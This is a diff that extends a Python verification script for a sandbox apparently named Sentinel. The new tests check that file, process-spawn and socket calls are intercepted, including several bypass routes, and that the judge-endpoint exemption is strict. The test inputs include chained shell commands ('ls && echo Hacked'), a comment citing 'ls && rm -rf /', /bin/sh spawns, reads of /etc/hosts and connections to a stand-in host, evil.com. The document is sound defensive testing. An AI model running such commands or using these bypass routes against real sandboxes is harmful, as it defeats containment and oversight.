@@ -6,8 +6,10 @@ import requests
 import urllib.request as urllib_request
 import http.client as http_client
 import socket
+import io
 from pathlib import Path
 import builtins
+from subprocess import Popen as captured_popen
 
 # Add src to path
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
@@ -41,6 +43,29 @@ except Exception as e:
     print(f"✅ PASSED: Blocked write to {fake_path}")
     print(f"   Reason: {e}")
 
+# TEST 1B: io.open should be intercepted too (no bypass)
+print("\n[TEST 1B] Testing io.open interception...")
+try:
+    with io.open("/etc/hosts", "r", encoding="utf-8") as f:
+        _ = f.readline()
+    print("❌ FAILED: io.open bypassed Sentinel file policy!")
+except Exception as e:
+    print("✅ PASSED: io.open is blocked for restricted paths.")
+    print(f"   Reason: {e}")
+
+# TEST 1C: os.open should be intercepted too (no bypass)
+print("\n[TEST 1C] Testing os.open interception...")
+try:
+    fd = os.open("/etc/hosts", os.O_RDONLY)
+    try:
+        _ = os.read(fd, 1)
+    finally:
+        os.close(fd)
+    print("❌ FAILED: os.open bypassed Sentinel file policy!")
+except Exception as e:
+    print("✅ PASSED: os.open is blocked for restricted paths.")
+    print(f"   Reason: {e}")
+
 # TEST 2: The "Shell Chaining" Attack
 # Old Vulnerability: "ls && rm -rf /" passed because it started with "ls"
 print("\n[TEST 2] Testing Shell Injection (&& chaining)...")
@@ -60,6 +85,15 @@ except Exception as e:
     print("✅ PASSED: Blocked subprocess.Popen chaining.")
     print(f"   Reason: {e}")
 
+# TEST 3B: captured pre-activation Popen reference should still be intercepted
+print("\n[TEST 3B] Testing captured Popen reference interception...")
+try:
+    captured_popen("ls && echo 'Hacked'", shell=True)
+    print("❌ FAILED: Captured pre-activation Popen reference bypassed policy!")
+except Exception as e:
+    print("✅ PASSED: Captured pre-activation Popen reference is blocked.")
+    print(f"   Reason: {e}")
+
 # TEST 4: os.system interception
 print("\n[TEST 4] Testing os.system interception...")
 try:
@@ -68,6 +102,30 @@ try:
 except Exception as e:
     print("✅ PASSED: Blocked os.system chaining.")
     print(f"   Reason: {e}")
+
+# TEST 4B: os.posix_spawn interception (if available)
+print("\n[TEST 4B] Testing os.posix_spawn interception...")
+if hasattr(os, "posix_spawn"):
+    try:
+        os.posix_spawn("/bin/sh", ["/bin/sh", "-c", "echo Hacked"], {})
+        print("❌ FAILED: os.posix_spawn command executed!")
+    except Exception as e:
+        print("✅ PASSED: Blocked os.posix_spawn command.")
+        print(f"   Reason: {e}")
+else:
+    print("ℹ️ SKIPPED: os.posix_spawn not available on this platform.")
+
+# TEST 4C: os.spawnlp interception (if available)
+print("\n[TEST 4C] Testing os.spawnlp interception...")
+if hasattr(os, "spawnlp"):
+    try:
+        os.spawnlp(os.P_WAIT, "sh", "sh", "-c", "echo Hacked")
+        print("❌ FAILED: os.spawnlp command executed!")
+    except Exception as e:
+        print("✅ PASSED: Blocked os.spawnlp command.")
+        print(f"   Reason: {e}")
+else:
+    print("ℹ️ SKIPPED: os.spawnlp not available on this platform.")
 
 # TEST 5: requests.post interception
 print("\n[TEST 5] Testing requests.post network interception...")
@@ -116,10 +174,83 @@ try:
         print(f"   Reason: {e}")
     finally:
         sock.close()
+
+    # connect_ex should also be blocked (it previously bypassed connect hook).
+    sock_ex = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock_ex.settimeout(1)
+        rc = sock_ex.connect_ex(("evil.com", 80))
+        if rc == 0:
+            print("❌ FAILED: socket.connect_ex to blocked host succeeded!")
+        else:
+            print("✅ PASSED: socket.connect_ex to disallowed host blocked.")
+            print(f"   Return code: {rc}")
+    except Exception as e:
+        print("✅ PASSED: socket.connect_ex blocked with exception.")
+        print(f"   Reason: {e}")
+    finally:
+        sock_ex.close()
+
+    # UDP sendto without connect should also be blocked.
+    sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        sock_udp.settimeout(1)
+        sock_udp.sendto(b"x", ("evil.com", 53))
+        print("❌ FAILED: socket.sendto to blocked host executed!")
+    except Exception as e:
+        print("✅ PASSED: socket.sendto to disallowed host blocked.")
+        print(f"   Reason: {e}")
+    finally:
+        sock_udp.close()
+
+    # Ensure judge endpoint exemption is strict to endpoint port only.
+    sock_local = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        sock_local.settimeout(1)
+        sock_local.connect(("localhost", 22))
+        print("❌ FAILED: socket.connect to localhost:22 was allowed by judge-host exemption!")
+    except PermissionError as e:
+        print("✅ PASSED: localhost:22 blocked (judge exemption does not apply).")
+        print(f"   Reason: {e}")
+    except Exception as e:
+        print(f"❌ FAILED: Expected policy block for localhost:22, got runtime error: {e}")
+    finally:
+        sock_local.close()
 finally:
     deactivate_sentinel()
     core.socket_failsafe_enabled = previous_socket_failsafe
     activate_sentinel()
+
+# TEST 5E: judge host should not be globally exempt (only exact endpoint)
+print("\n[TEST 5E] Testing strict judge endpoint exemption...")
+try:
+    requests.get("http://localhost:9", timeout=1)
+    print("❌ FAILED: localhost:9 was allowed by over-broad judge exemption!")
+except PermissionError as e:
+    print("✅ PASSED: localhost:9 blocked (not the exact judge endpoint).")
+    print(f"   Reason: {e}")
+except Exception as e:
+    print(f"❌ FAILED: Expected policy block for localhost:9, got runtime error: {e}")
+
+print("\n[TEST 5F] Testing exact judge endpoint remains allowed...")
+try:
+    requests.post("http://localhost:11434/api/generate", json={"model": "x", "prompt": "safe"}, timeout=1)
+    print("✅ PASSED: Exact judge endpoint request executed.")
+except PermissionError as e:
+    print(f"❌ FAILED: Exact judge endpoint was blocked: {e}")
+except Exception as e:
+    # Connection issues are fine; this checks policy path, not endpoint availability.
+    print(f"✅ PASSED: Exact judge endpoint not blocked by policy (runtime error: {type(e).__name__}).")
+
+print("\n[TEST 5G] Testing host mismatch with judge port/path is blocked...")
+try:
+    requests.get("http://evil.com:11434/api/generate", timeout=1)
+    print("❌ FAILED: Non-judge host with judge port/path was allowed!")
+except PermissionError as e:
+    print("✅ PASSED: Non-judge host blocked even when port/path match judge endpoint.")
+    print(f"   Reason: {e}")
+except Exception as e:
+    print(f"❌ FAILED: Expected policy block for evil.com judge-like URL, got runtime error: {e}")
 
 # TEST 6: shell-aware parsing should allow quoted operator characters
 print("\n[TEST 6] Testing quoted shell operators are not misdetected...")
@@ -184,19 +315,49 @@ finally:
 # TEST 9: activation idempotency
 print("\n[TEST 9] Testing activate_sentinel idempotency...")
 before_open = builtins.open
+before_io_open = io.open
+before_path_open = Path.open
+before_os_open = os.open
 before_run = subprocess.run
 before_session_request = requests.sessions.Session.request
 before_socket_connect = socket.socket.connect
+before_socket_connect_ex = socket.socket.connect_ex
+before_socket_sendto = socket.socket.sendto
+before_popen_init = core._original_popen.__init__
+before_posix_spawn = getattr(os, "posix_spawn", None)
+before_posix_spawnp = getattr(os, "posix_spawnp", None)
+before_spawnlp = getattr(os, "spawnlp", None)
+before_execvp = getattr(os, "execvp", None)
 activate_sentinel()
 after_open = builtins.open
+after_io_open = io.open
+after_path_open = Path.open
+after_os_open = os.open
 after_run = subprocess.run
 after_session_request = requests.sessions.Session.request
 after_socket_connect = socket.socket.connect
+after_socket_connect_ex = socket.socket.connect_ex
+after_socket_sendto = socket.socket.sendto
+after_popen_init = core._original_popen.__init__
+after_posix_spawn = getattr(os, "posix_spawn", None)
+after_posix_spawnp = getattr(os, "posix_spawnp", None)
+after_spawnlp = getattr(os, "spawnlp", None)
+after_execvp = getattr(os, "execvp", None)
 if (
     before_open is after_open
+    and before_io_open is after_io_open
+    and before_path_open is after_path_open
+    and before_os_open is after_os_open
     and before_run is after_run
     and before_session_request is after_session_request
     and before_socket_connect is after_socket_connect
+    and before_socket_connect_ex is after_socket_connect_ex
+    and before_socket_sendto is after_socket_sendto
+    and before_popen_init is after_popen_init
+    and before_posix_spawn is after_posix_spawn
+    and before_posix_spawnp is after_posix_spawnp
+    and before_spawnlp is after_spawnlp
+    and before_execvp is after_execvp
 ):
     print("✅ PASSED: Repeated activation does not stack/replace patches.")
 else:
@@ -207,11 +368,21 @@ print("\n[TEST 10] Testing deactivate_sentinel restoration...")
 deactivate_sentinel()
 restored = (
     builtins.open is core._original_open
+    and io.open is core._original_io_open
+    and Path.open is core._original_path_open
+    and os.open is core._original_os_open
     and subprocess.run is core._original_run
     and subprocess.Popen is core._original_popen
+    and core._original_popen.__init__ is core._original_popen_init
     and os.system is core._original_os_system
+    and getattr(os, "posix_spawn", None) is core._original_posix_spawn
+    and getattr(os, "posix_spawnp", None) is core._original_posix_spawnp
+    and getattr(os, "spawnlp", None) is core._ORIGINAL_SPAWN_FNS["spawnlp"]
+    and getattr(os, "execvp", None) is core._ORIGINAL_EXEC_FNS["execvp"]
     and requests.sessions.Session.request is core._original_session_request
     and socket.socket.connect is core._original_socket_connect
+    and socket.socket.connect_ex is core._original_socket_connect_ex
+    and socket.socket.sendto is core._original_socket_sendto
 )
 if not restored:
     print("❌ FAILED: Deactivation did not restore all original functions.")
@@ -254,9 +425,14 @@ except Exception as e:
 # Teardown: cleanup test artifact if it exists.
 if fake_workspace_dir.exists() and fake_workspace_dir.is_dir():
     try:
+        set_approval_handler(
+            lambda alert: alert.action == "file_access" and str(fake_workspace_dir) in str(alert.target)
+        )
         shutil.rmtree(fake_workspace_dir)
+        clear_approval_handler()
         print(f"\n[TEARDOWN] Removed test artifact: {fake_workspace_dir}")
     except Exception as e:
+        clear_approval_handler()
         print(f"\n[TEARDOWN] Could not remove {fake_workspace_dir}: {e}")
 
 print("\n--- 🛡️ VERIFICATION END ---")
